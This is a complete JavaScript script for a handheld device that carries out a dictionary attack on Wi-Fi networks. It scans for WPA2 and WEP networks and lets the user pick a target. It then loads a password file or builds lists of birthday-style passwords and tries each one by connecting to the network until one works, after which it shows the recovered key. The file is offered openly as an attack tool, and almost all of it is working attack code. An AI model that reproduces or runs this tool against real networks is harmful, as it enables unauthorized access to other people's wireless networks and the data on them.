// Wifi dictionary-based attacker
// use at your own risk, some devices may lock you out as a security mechanism when spammed with this!
// GITHUB: @DataSC3

// Graphic constants
var WIDTH = 240;
var HEIGHT = 135;
var BLACK = 0;
var WHITE = 16777215;
var GREEN = 65280;
var RED = 16711680;
var BLUE = 255;
var YELLOW = 16776960;
var CYAN = 65535;
var GRAY = 8421504;
var ORANGE = 16753920;

var currentSelection = 0;
var menuScroll = 0;
var menuOptions = [];
var staticDrawn = false;
var MENU_VISIBLE_ITEMS = 5; // How many items are visible on the screen

function drawMenu(title, options, selection, scroll) {
    fillScreen(BLACK);
    
    // Title
    setTextSize(2);
    setTextColor(YELLOW);
    drawString(title, 10, 15);
    
    // Dividing line
    drawLine(10, 35, WIDTH - 10, 35, GRAY);
    
    // Scrolling menu options
    setTextSize(1);
    
    // Automatically adjust the scrolling
    if (selection < scroll) {
        scroll = selection;
    } else if (selection >= scroll + MENU_VISIBLE_ITEMS) {
        scroll = selection - MENU_VISIBLE_ITEMS + 1;
    }
    
    var startY = 45;
    var itemHeight = 18;
    
    for (var i = 0; i < options.length; i++) {
        // Showing only visible items
        if (i < scroll || i >= scroll + MENU_VISIBLE_ITEMS) continue;
        
        var displayIdx = i - scroll;
        var yPos = startY + displayIdx * itemHeight;
        
        if (i === selection) {
            // Selected point
            drawFillRect(15, yPos - 2, WIDTH - 30, 16, GRAY);
            setTextColor(BLACK);
            drawString("> " + options[i], 20, yPos + 1);
        } else {
            setTextColor(WHITE);
            drawString("  " + options[i], 20, yPos + 1);
        }
    }
    
    // Show the scrolling arrows if necessary
    if (scroll > 0) {
        setTextColor(YELLOW);
        drawString("▲", WIDTH - 15, startY - 5);
    }
    if (scroll + MENU_VISIBLE_ITEMS < options.length) {
        setTextColor(YELLOW);
        drawString("▼", WIDTH - 15, startY + MENU_VISIBLE_ITEMS * itemHeight - 5);
    }
    
    // Status bar
    drawLine(10, HEIGHT - 20, WIDTH - 10, HEIGHT - 20, GRAY);
    setTextSize(1);
    setTextColor(CYAN);
    
    // Status bar text
    // drawString("[#] NO-Wifi Attack v1.0", 10, HEIGHT - 10);
    
    return scroll; // Returning the updated scroll
}

function drawStatus(message, isError) {
    fillScreen(BLACK);
    setTextSize(2);
    setTextColor(isError ? RED : GREEN);
    drawString("> STATUS", WIDTH/2 - 40, 30);
    
    setTextSize(1);
    setTextColor(WHITE);
    
    // Splitting the message into lines
    var lines = [];
    var words = message.split(' ');
    var currentLine = '';
    
    for (var i = 0; i < words.length; i++) {
        if ((currentLine + words[i]).length < 30) {
            currentLine += words[i] + ' ';
        } else {
            lines.push(currentLine);
            currentLine = words[i] + ' ';
        }
    }
    if (currentLine) lines.push(currentLine);
    
    // Displaying the lines
    for (var j = 0; j < lines.length; j++) {
        drawString(lines[j], 10, 60 + j * 15);
    }
    
    setTextColor(YELLOW);
    drawString("[#] Press any key to continue", WIDTH/2 - 70, HEIGHT - 20);
}

function drawProgress(ssid, current, total, password) {
    fillScreen(BLACK);
    
    // Title
    setTextSize(2);
    setTextColor(ORANGE);
    drawString("WIFI-ATTACKS v1", 10, 15);
    
    // Progress bar
    var progressWidth = (current / total) * (WIDTH - 20);
    drawRect(10, 35, WIDTH - 20, 10, WHITE);
    drawFillRect(10, 35, progressWidth, 10, GREEN);
    
    // Information
    setTextSize(1);
    setTextColor(WHITE);
    drawString("[#] Target: " + ssid, 10, 55);
    drawString("[#] Progress: " + current + "/" + total, 10, 70);
    drawString("[#] Trying: " + password, 10, 85);
    
    // Percent
    var percent = Math.round((current / total) * 100);
    setTextColor(CYAN);
    drawString(percent + "%", WIDTH - 30, 70);
    
    // Status bar
    drawLine(10, HEIGHT - 20, WIDTH - 10, HEIGHT - 20, GRAY);
    setTextColor(YELLOW);
    drawString("[#] Press SEL to stop", 10, HEIGHT - 10);
}

function wifiDictAttack(ssid, pwds) {
    var connected = false;
    var stopAttack = false;
    
    for (var i = 0; i < pwds.length; i++) {
        if (stopAttack) {
            drawStatus("[!] Attack stopped by user", false);
            waitForInput();
            return;
        }
        
        if (!pwds[i].trim()) continue;
        
        // View progress bar
        drawProgress(ssid, i + 1, pwds.length, pwds[i]);
        
        serialPrintln("[*] Trying PWD > " + ssid + ": " + pwds[i]);
        connected = wifiConnect(ssid, 3, pwds[i]);
        
        if (connected) {
            drawStatus("[*] PASSWORD FOUND!       [#] Network: " + ssid + "       [#] Password: " + pwds[i], false);
            serialPrintln("[*] PWD Found: " + ssid + ": " + pwds[i]);
            waitForInput();
            return;
        }
        
        // Checking if the button is pressed to stop
        if (getSelPress()) {
            stopAttack = true;
        }
    }
    
    drawStatus("[!] PASSWORD NOT FOUND       [*] Tried: " + pwds.length + " PWD'S", true);
    waitForInput();
}

function waitForInput() {
    while (true) {
        if (getSelPress() || getPrevPress() || getNextPress()) {
            delay(200);
            break;
        }
        delay(50);
    }
}

function generateBirthdayDict(startYear, endYear, formatType) {
    var passwords = [];
    
    if (formatType == "DDMMYYYY") {
        for (var day = 1; day <= 31; day++) {
            for (var month = 1; month <= 12; month++) {
                for (var year = startYear; year <= endYear; year++) {
                    var dd = day < 10 ? "0" + day : "" + day;
                    var mm = month < 10 ? "0" + month : "" + month;
                    var yyyy = "" + year;
                    var yy = yyyy.substring(2);
                    
                    passwords.push(dd + mm + yyyy);
                    passwords.push(dd + mm + yy);
                }
            }
        }
    } else if (formatType == "MMDDYYYY") {
        for (var day = 1; day <= 31; day++) {
            for (var month = 1; month <= 12; month++) {
                for (var year = startYear; year <= endYear; year++) {
                    var dd = day < 10 ? "0" + day : "" + day;
                    var mm = month < 10 ? "0" + month : "" + month;
                    var yyyy = "" + year;
                    var yy = yyyy.substring(2);
                    
                    passwords.push(mm + dd + yyyy);
                    passwords.push(mm + dd + yy);
                }
            }
        }
    } else if (formatType == "YYYY-YYYY") {
        for (var year1 = startYear; year1 <= endYear; year1++) {
            for (var year2 = startYear; year2 <= endYear; year2++) {
                var yyyy1 = "" + year1;
                var yyyy2 = "" + year2;
                var yy1 = yyyy1.substring(2);
                var yy2 = yyyy2.substring(2);
                
                passwords.push(yyyy1 + yyyy2);
                passwords.push(yyyy1 + yy2);
                passwords.push(yy1 + yyyy2);
                passwords.push(yy1 + yy2);
            }
        }
    }
    
    return passwords;
}

function showFormatMenu() {
    currentSelection = 0;
    menuScroll = 0;
    var formats = ["[-] Type: DDMMYYYY", "[-] Type: MMDDYYYY", "[-] Type: YYYY-YYYY", "[<] Back"];
    
    while (true) {
        menuScroll = drawMenu("> SELECT FORMAT", formats, currentSelection, menuScroll);
        
        if (getPrevPress()) {
            currentSelection = Math.max(0, currentSelection - 1);
            delay(200);
        } else if (getNextPress()) {
            currentSelection = Math.min(formats.length - 1, currentSelection + 1);
            delay(200);
        } else if (getSelPress()) {
            if (currentSelection == 3) return null;
            
            var formatType = formats[currentSelection].replace("[-] Type: ", "");
            var dict = showYearRangeMenu(formatType);
            if (dict) return dict;
            
            currentSelection = 0;
            menuScroll = 0;
        }
        
        delay(50);
    }
}

function showYearRangeMenu(formatType) {
    currentSelection = 0;
    menuScroll = 0;
    var ranges = ["1950-1960", "1960-1970", "1970-1980", "1980-1990", 
                  "1990-2000", "2000-2010", "2010-2020", "2020-2025", "[^] Back"];
    
    while (true) {
        menuScroll = drawMenu("> SELECT YEARS", ranges, currentSelection, menuScroll);
        
        if (getPrevPress()) {
            currentSelection = Math.max(0, currentSelection - 1);
            delay(200);
        } else if (getNextPress()) {
            currentSelection = Math.min(ranges.length - 1, currentSelection + 1);
            delay(200);
        } else if (getSelPress()) {
            if (currentSelection == 8) return null;
            
            var range = ranges[currentSelection];
            var yearRange = range.split('-');
            var startYear = parseInt(yearRange[0]);
            var endYear = parseInt(yearRange[1]);
            
            drawStatus("[#] Generating: " + formatType + " > " + range + "...", false);
            var dict = generateBirthdayDict(startYear, endYear, formatType);
            drawStatus("[#] Generated: " + dict.length + " PWD       [#] Format: " + formatType + "       [#] Range: " + range, false);
            waitForInput();
            return dict;
        }
        
        delay(50);
    }
}

function scanNetworks() {
    drawStatus("[*] Scanning WIFI..", false);
    var networks = wifiScan();
    
    if (!networks || networks.length == 0) {
        drawStatus("[!] No WiFi networks found!", true);
        waitForInput();
        return null;
    }
    
    currentSelection = 0;
    menuScroll = 0;
    var networkOptions = [];
    
    for (var i = 0; i < networks.length; i++) {
        var net = networks[i];
        if (net.encryptionType == "WPA2_PSK" || net.encryptionType == "WEP") {
            var label = "[" + (i+1) + "] " + net.SSID + " (" + net.RSSI + "dBm)";
            networkOptions.push(label);
        }
    }
    
    if (networkOptions.length == 0) {
        drawStatus("[!] No supported networks found!", true);
        waitForInput();
        return null;
    }
    
    networkOptions.push("[<] Back");
    
    while (true) {
        menuScroll = drawMenu("> SELECT NETWORK", networkOptions, currentSelection, menuScroll);
        
        if (getPrevPress()) {
            currentSelection = Math.max(0, currentSelection - 1);
            delay(200);
        } else if (getNextPress()) {
            currentSelection = Math.min(networkOptions.length - 1, currentSelection + 1);
            delay(200);
        } else if (getSelPress()) {
            if (currentSelection == networkOptions.length - 1) return null;
            
            var selectedNet = networks[currentSelection];
            drawStatus("[*] Selected: " + selectedNet.SSID + " (" + selectedNet.RSSI + " dBm)", false);
            waitForInput();
            return selectedNet.SSID;
        }
        
        delay(50);
    }
}

function loadDictionary() {
    drawStatus("[#] Please select password file..", false);
    var passwords_file = dialogPickFile("/");
    
    if (!passwords_file) {
        return null;
    }
    
    var passwords_to_try = storageRead(passwords_file);
    if (!passwords_to_try) {
        drawStatus("[!] Cannot read file!", true);
        waitForInput();
        return null;
    }
    
    var raw_passwords = passwords_to_try.split("\n");
    var passwords_arr = [];
    
    for (var i = 0; i < raw_passwords.length; i++) {
        var pwd = raw_passwords[i].replace(/\r/g, '').trim();
        if (pwd) {
            passwords_arr.push(pwd);
        }
    }
    
    drawStatus("[^] Loaded " + passwords_arr.length + " PWD'S", false);
    waitForInput();
    return passwords_arr;
}

// Main loop with sequential menu
var network_to_attack_ssid = "";
var passwords_to_try_arr = [];
currentSelection = 0;
menuScroll = 0;
var shouldExit = false;
var currentStep = 0;

while (true) {
    if (shouldExit) {
        break;
    }
    
    var menuToShow = [];
    var menuTitle = "";
    
    // Sequential menu depending on the current step
    if (currentStep == 0) {
        // Step 1: Choice WiFi
        menuTitle = "> SELECT WIFI";
        menuToShow = ["[*] Scan WIFI", "[<] Exit"];
        
        if (network_to_attack_ssid) {
            menuToShow[0] = "[*] WiFi: " + network_to_attack_ssid;
        }
        
    } else if (currentStep == 1) {
        // Step 2: Choosing a dictionary
        menuTitle = "> SELECT DICTIONARY";
        menuToShow = ["[^] Load Password's File", "[^] Create Password's List", "[<] Back to WiFi"];
        
        if (passwords_to_try_arr.length > 0) {
            menuToShow[0] = "[#] Passwords: " + passwords_to_try_arr.length;
            menuToShow[1] = "[#] Passwords: " + passwords_to_try_arr.length;
        }
        
    } else if (currentStep == 2) {
        // Step 3: Attack
        menuTitle = "> START ATTACK";
        menuToShow = [
            "[*] Target: " + network_to_attack_ssid,
            "[#] Passwords: " + passwords_to_try_arr.length,
            "[!] START ATTACK",
            "[<] Back to menu"
        ];
    }
    
    menuScroll = drawMenu(menuTitle, menuToShow, currentSelection, menuScroll);
    
    if (getPrevPress()) {
        currentSelection = Math.max(0, currentSelection - 1);
        delay(200);
    } else if (getNextPress()) {
        currentSelection = Math.min(menuToShow.length - 1, currentSelection + 1);
        delay(200);
    } else if (getSelPress()) {
        if (currentStep == 0) {
            // Step 1: Select WiFi
            switch (currentSelection) {
                case 0: 
                    var ssid = scanNetworks();
                    if (ssid) {
                        network_to_attack_ssid = ssid;
                        currentStep = 1; // Moving on to choosing a dictionary
                        currentSelection = 0;
                    }
                    break;
                case 1: // Exit
                    shouldExit = true;
                    break;
            }
        } else if (currentStep == 1) {
            // Step 2: Selecting a dictionary
            switch (currentSelection) {
                case 0: // Load Dictionary
                    var dict = loadDictionary();
                    if (dict) {
                        passwords_to_try_arr = dict;
                        currentStep = 2; // Moving on to the attack
                        currentSelection = 0;
                    }
                    break;
                case 1: // Create Dictionary
                    var newDict = showFormatMenu();
                    if (newDict) {
                        passwords_to_try_arr = newDict;
                        currentStep = 2; // Moving on to the attack
                        currentSelection = 0;
                    }
                    break;
                case 2: // Back to WiFi
                    currentStep = 0;
                    currentSelection = 0;
                    break;
            }
        } else if (currentStep == 2) {
            // Step 3: Attack
            switch (currentSelection) {
                case 2: // START ATTACK
                    wifiDictAttack(network_to_attack_ssid, passwords_to_try_arr);
                    wifiDisconnect();
                    break;
                case 3: // Back to Dictionary
                    currentStep = 1;
                    currentSelection = 0;
                    break;
            }
        }
        
        delay(200);
    }
    
    delay(50);
}

// BYE MESSAGE
fillScreen(BLACK); 
setTextSize(1);
setTextColor(YELLOW);
drawString("GITHUB: @DataSC3", WIDTH/2 - 50, HEIGHT/2 - 10);
delay(2000);

fillScreen(BLACK);
setTextSize(1);
setTextColor(YELLOW);
drawString("^_^ GOODBYE ^_^", WIDTH/2 - 50, HEIGHT/2 - 10);
delay(1000);

